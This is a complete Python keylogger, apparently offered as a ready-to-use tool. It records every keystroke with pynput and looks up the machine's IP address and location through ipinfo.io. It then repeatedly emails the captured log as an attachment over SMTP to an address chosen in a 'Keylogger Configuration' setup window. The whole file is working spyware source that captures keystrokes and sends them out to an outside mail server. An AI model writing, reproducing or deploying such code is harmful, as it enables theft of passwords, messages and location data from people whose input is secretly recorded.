# Libraries
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib
from pynput.keyboard import Key, Listener
import time
from dotenv import load_dotenv
import os
import requests
import tkinter as tk
from tkinter import messagebox

# Load environment variables from .env file
load_dotenv()

# Configurable settings
keylog_info = os.getenv("LOG_FILE")
file_path = os.getenv("FILE_PATH")
extend = "\\"

keys = []
iteration_count = 0

# Environment variables
email_address = os.getenv("EMAIL_ADDRESS")
password = os.getenv("EMAIL_PASSWORD")
default_recipient_email = os.getenv("DEFAULT_RECIPIENT_EMAIL")
smtp_server = os.getenv("SMTP_SERVER", "smtp.gmail.com")
smtp_port = int(os.getenv("SMTP_PORT", 587))


def get_user_input():
    """Display a single GUI window to get all inputs from the user."""
    def submit():
        global recipient_email, time_interval, max_iterations
        recipient_email = email_entry.get()
        if not recipient_email:
            recipient_email = default_recipient_email

        try:
            time_interval = int(time_interval_entry.get())
            if time_interval <= 0:
                raise ValueError
        except ValueError:
            messagebox.showerror("Error", "Time interval must be a positive integer.")
            root.destroy()
            exit(1)

        try:
            max_iterations = int(max_iterations_entry.get())
            if max_iterations <= 0:
                raise ValueError
        except ValueError:
            messagebox.showerror("Error", "Max iterations must be a positive integer.")
            root.destroy()
            exit(1)

        root.destroy()

    def on_close():
        """Handle the window close event."""
        root.destroy()
        exit(0)  # Exit the program

    root = tk.Tk()
    root.title("Keylogger Configuration")

    # Bind the close button to the custom function
    root.protocol("WM_DELETE_WINDOW", on_close)

    # Recipient Email
    tk.Label(root, text="Recipient Email:").grid(row=0, column=0, padx=10, pady=5, sticky="e")
    email_entry = tk.Entry(root, width=30)
    email_entry.grid(row=0, column=1, padx=10, pady=5)
    email_entry.insert(0, default_recipient_email)  # Default email

    # Time Interval
    tk.Label(root, text="Log Time (in seconds):").grid(row=1, column=0, padx=10, pady=5, sticky="e")
    time_interval_entry = tk.Entry(root, width=30)
    time_interval_entry.grid(row=1, column=1, padx=10, pady=5)

    # Max Iterations
    tk.Label(root, text="Number of Logs:").grid(row=2, column=0, padx=10, pady=5, sticky="e")
    max_iterations_entry = tk.Entry(root, width=30)
    max_iterations_entry.grid(row=2, column=1, padx=10, pady=5)

    # Submit Button
    submit_button = tk.Button(root, text="Submit", command=submit)
    submit_button.grid(row=3, column=0, columnspan=2, pady=10)

    root.mainloop()

    return recipient_email, time_interval, max_iterations



def log_geolocation_and_write(file_path, file_name):
    """Fetches the system's geolocation and writes it at the top of the specified log file."""
    try:
        ip_data = requests.get("https://ipinfo.io").json()
        geolocation = (
            "System Geolocation\n"
            f"\t\tIP: {ip_data.get('ip', 'N/A')}\n"
            f"\t\tLocation: {ip_data.get('city', 'N/A')}, {ip_data.get('region', 'N/A')}, {ip_data.get('country', 'N/A')}\n\n"
        )
    except Exception as e:
        geolocation = f"System Geolocation: Geolocation fetch error: {e}\n\n"

    with open(file_path + extend + file_name, "w") as f:
        f.write(geolocation)


def send_email(filename, attachment, recipient_email):
    """Sends an email with an attachment using the provided configuration."""
    fromaddr = email_address

    msg = MIMEMultipart()
    msg['From'] = fromaddr
    msg['To'] = recipient_email
    msg['Subject'] = "Log File"

    body = "Attached is the latest key log file."
    msg.attach(MIMEText(body, 'plain'))

    with open(attachment, 'rb') as file:
        p = MIMEBase('application', 'octet-stream')
        p.set_payload(file.read())
    encoders.encode_base64(p)
    p.add_header('Content-Disposition', f"attachment; filename={filename}")
    msg.attach(p)

    try:
        with smtplib.SMTP(smtp_server, smtp_port) as s:
            s.starttls()
            s.login(fromaddr, password)
            s.sendmail(fromaddr, recipient_email, msg.as_string())
    except smtplib.SMTPException as e:
        print(f"Failed to send email: {e}")


def write_file(keys_list):
    with open(file_path + extend + keylog_info, "a") as f:
        for key in keys_list:
            k = str(key).replace("'", "")
            if "Key.space" in k:
                f.write(" ")
            elif "Key.enter" in k:
                f.write('\n')
            elif "Key.tab" in k:
                f.write('\t')
            elif "Key" not in k:
                f.write(k)


def on_press(key):
    global keys
    keys.append(key)
    if len(keys) >= 1:
        write_file(keys)
        keys = []


def on_release(key):
    if key == Key.esc:
        return False


if __name__ == "__main__":
    # Get user input for recipient email, time interval, and max iterations
    recipient_email, time_interval, max_iterations = get_user_input()

    # Main Program
    while iteration_count < max_iterations:
        session_end_time = time.time() + time_interval

        # Write geolocation at the start of the log file for the current session
        log_geolocation_and_write(file_path, keylog_info)

        with Listener(on_press=on_press, on_release=on_release) as listener:
            while time.time() < session_end_time:
                time.sleep(0.1)  # Avoid high CPU usage
            listener.stop()

        send_email(keylog_info, file_path + extend + keylog_info, recipient_email)

        # Clear the log file
        with open(file_path + extend + keylog_info, "w") as f:
            f.write("")

        iteration_count += 1
